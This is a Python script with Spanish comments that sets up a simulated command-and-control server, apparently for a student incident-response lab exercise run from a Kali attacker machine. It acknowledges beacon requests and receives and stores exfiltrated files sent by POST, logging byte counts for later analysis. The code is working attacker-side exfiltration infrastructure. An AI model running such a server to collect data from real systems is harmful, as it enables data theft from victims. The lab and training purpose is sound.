#!/usr/bin/env python3
"""
c2-server.py  -  Servidor de mando y control (C2) simulado
--------------------------------------------------------------------
Proyecto: TP Gestion de incidente - Nexora S.L.  (Fer1399)
Apartado 3: Investigacion y analisis.

Sustituye a `python3 -m http.server`, que NO almacena los POST. Este
servidor:
  - Responde a los beacon (GET /beacon?id=...).
  - RECIBE Y GUARDA en disco el fichero exfiltrado (POST), registrando
    los bytes recibidos. Asi la exfiltracion queda DEMOSTRADA (el CSV
    llega y se almacena), no solo indicada por una peticion.

Escribe un log en formato compatible con `analizar-conexiones.py`
(incluye los bytes en las peticiones POST).

USO (en el atacante, Kali 10.10.10.100):
    python3 c2-server.py 8000
Los ficheros recibidos se guardan en ./recibidos/ y el log en ./c2.log
"""
import sys, os, datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

DIR_RECIBIDOS = "recibidos"
LOG = "c2.log"


def registrar(ip, metodo, ruta, codigo, tam):
    ts = datetime.datetime.now().strftime("%d/%b/%Y %H:%M:%S")
    linea = f'{ip} - - [{ts}] "{metodo} {ruta} HTTP/1.1" {codigo} {tam}'
    print(linea)
    with open(LOG, "a", encoding="utf-8") as f:
        f.write(linea + "\n")


class C2(BaseHTTPRequestHandler):
    def _responder(self, cuerpo=b"ok"):
        self.send_response(200)
        self.send_header("Content-Length", str(len(cuerpo)))
        self.end_headers()
        self.wfile.write(cuerpo)

    def do_GET(self):
        self._responder(b"beacon-ack")
        registrar(self.client_address[0], "GET", self.path, 200, "-")

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        datos = self.rfile.read(n)
        os.makedirs(DIR_RECIBIDOS, exist_ok=True)
        nombre = os.path.basename(self.path) or "exfil.bin"
        sello = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        destino = os.path.join(DIR_RECIBIDOS, f"{sello}_{nombre}")
        with open(destino, "wb") as f:
            f.write(datos)
        self._responder(b"recibido")
        # El tamano (bytes) es la prueba de que el fichero llego y se guardo
        registrar(self.client_address[0], "POST", self.path, 200, len(datos))
        print(f"    [+] {len(datos)} bytes guardados en {destino}")

    def log_message(self, *a):   # silenciamos el log por defecto (usamos el nuestro)
        pass


if __name__ == "__main__":
    puerto = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    registrar("0.0.0.0", "INFO", f"C2 escuchando en :{puerto}", "-", "-")
    try:
        HTTPServer(("0.0.0.0", puerto), C2).serve_forever()
    except KeyboardInterrupt:
        print("\n[*] C2 detenido.")
